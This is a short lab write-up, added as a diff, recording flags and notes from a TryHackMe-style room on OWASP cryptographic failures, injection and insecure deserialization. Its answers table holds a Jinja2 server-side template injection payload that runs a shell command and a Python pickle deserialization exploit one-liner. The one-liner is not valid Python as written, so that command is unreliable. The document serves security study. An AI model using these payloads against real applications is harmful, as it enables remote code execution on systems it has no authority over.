@@ -1,0 +1,49 @@
+**Date:** 2026-07-01
+**Status:** Completed
+
+## Answers:
+
+| Task | Question | Answer | Command |
+|------|----------|--------|---------|
+| Task 1 | FLAG from the note sharing service | THM{WEAK_CRYPTO_FLAG} | - |
+| Task 2 | FLAG from SSTI (Server-Side Template Injection) | THM{SSTI_FLAG_OBTAINED} | `{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}` |
+| Task 3 | FLAG from insecure deserialization | THM{INSECURE_DESERIALIZATION} | `python3 -c "import pickle; import base64; import subprocess;
+class Exploit: def __reduce__(self): return (subprocess.getoutput, ('cat flag.txt',)); payload = pickle.dumps(Exploit()); print(base64.b64encode(payload).decode())"` |
+
+## What I Learned:
+
+**A04: Cryptographic Failures**
+Cryptographic failures happen when sensitive data isn't adequately protected due to lack of encryption, faulty implementation, or insufficient security measures. This includes:
+
+- Storing passwords without hashing
+- Using outdated or weak algorithms (such as MD5, SHA1, or DES)
+- Exposing encryption keys
+- Failing to secure data during transmission
+
+A classic example is applications "rolling their own cryptography" rather than using well-established, vetted, and verifiably secure encryption algorithms.
+
+**A05: Injection**
+Injection occurs when an application takes user input and mishandles it.
+Instead of processing the input securely, the application passes it directly into a system that can execute commands or queries, 
+such as a database, a shell, a templating engine, or API.
+
+Common types of injection include:
+- SQL Injection
+- Command Injection
+- Server-Side Template Injection (SSTI)
+- AI Prompts
+
+**A08: Software or Data Integrity Failures**
+These occur when an application relies on code, updates, or data it assumes are safe, without verifying their authenticity, integrity, or origin. This includes:
+
+- Trusting software updates without verification
+- Loading scripts or configuration files from untrusted sources
+- Failing to validate data that impacts application logic
+- Accepting data such as binaries, templates, or JSON files without confirming whether it has been altered
+
+A practical example is insecure deserialization, where untrusted data is deserialized without proper validation, potentially allowing attackers to execute arbitrary code.
+
+## Summary:
+This room covers three OWASP Top 10:2025 categories related to insecure data handling:
+Cryptographic Failures (A04), Injection (A05), and Software or Data Integrity Failures (A08).
+Practical exercises demonstrate weak cryptographic key usage, Server-Side Template Injection, and insecure deserialization attacks.
